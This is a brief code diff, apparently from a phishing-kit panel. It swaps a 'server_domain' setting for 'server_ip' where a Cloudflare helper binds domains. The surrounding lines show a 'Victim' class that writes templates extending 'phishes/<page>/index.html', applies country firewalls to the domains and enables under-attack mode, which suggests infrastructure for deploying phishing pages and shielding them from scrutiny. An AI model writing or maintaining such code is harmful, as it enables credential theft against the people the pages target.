@@ -2,7 +2,7 @@ from peewee import SqliteDatabase
 from datetime import datetime
 from os import mkdir
 from shutil import rmtree
-from config import clf, server_domain
+from config import clf, server_ip
 import json
 
 class User:
@@ -176,7 +176,7 @@ class Victim:
                 f.write("{% extends 'phishes/" + page + "/index.html' %}")
                 f.close()
 
-                if clf.BindDomain(zone_id, domain, server_domain):
+                if clf.BindDomain(zone_id, domain, server_ip):
                     clf.CountryFirewall(zone_id, countries)
                     if security == 'true':
                         clf.SetUnderAttack(zone_id)
